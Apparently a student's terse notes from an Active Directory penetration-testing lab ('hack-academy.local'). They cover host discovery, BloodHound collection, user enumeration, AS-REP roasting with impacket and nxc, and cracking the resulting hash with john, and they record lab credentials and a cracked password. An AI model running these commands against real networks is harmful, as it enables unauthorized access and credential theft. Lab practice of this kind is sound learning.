
lfoster : Pindrop#1

route

Destination  Gateway     Genmask    Flags
default         10.0.2.1        0.0.0.0         UG        eth0

nxc smb 10.0.2.0/24

this is a fast way to find the machines

10.0.2.4 DC01
10.0.2.7  CLIENT-1
10.0.2.9  CLIENT-2

domain: hack-academy.local 

gedit ips

nmap -p- -Pn -iL ips -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt --open

---
getting bloodhound running

curl -L https://ghst.ly/getbhce -o docker-compose.yml
docker-compose pull && docker-compose up -d

run this command afterwards to set up bloodhound

docker-compose logs bloodhound | grep -i passw

will be given initial set of credentials to log in

localhost:8080/ui


pull data then ingest data

to confirm if it's domain controller, check if port 88 is open

nxc ldap 10.0.2.4 -u lfoster -p 'Pindrop#1' --bloodhound --collection All --dns-server 10.0.2.4

compressing output into /root/.nxc/logs/......._blondhound.zip

cp ....zip /tmp

bloodhound GUI upload data from tmp

will take time, meanwhile to do other checks

----
pull all the domain users

nxc ldap 10.0.2.4 -u lfoster -p 'Pindrop#1' --users

useful to have a list of users


nxc ldap 10.0.2.4 -u l foster -p 'Pindrop#1' --users | fgrep -v '[' | fgrep -vi '-Username-' | awk '{print$ 5}' | tee users

cat users

 nxc smb 10.0.2.4 -u lfoster -p 'Pindrop#1' --shares

per bloodhound
lfoster is member of 
USERS
DOMAINUSERS

save query

AMORALES

ADIAZ

no keberoastable users

most interesting is 
asreproasting

impacket-GetNPUsers hack-academy.local/ -dc-ip 10.0.2.4 -usersfile users -outputfile hashes.txt

with this, we see ADIAZ which bloodhound says is vulnerable, is indeed vulnerable.

-k for keberoastable

nxc ldap 10.0.2.4 -u l foster -p 'Pindrop#1' --users | fgrep -v '[' | fgrep -vi '-Username-' | awk '{print$ 5}' | tee users
nxc ldap 10.0.2.4 -u users -p '' -k --dns-server 10.0.2.4

reveals users that are vulnerable to asreproast attack

nxc ldap 10.0.2.4 -u users -p '' -k --dns-server 10.0.2.4 --asrep hash

cat hash

john --wordlist=/usr/share/wordlists/rockyou.txt hash


Peru123.
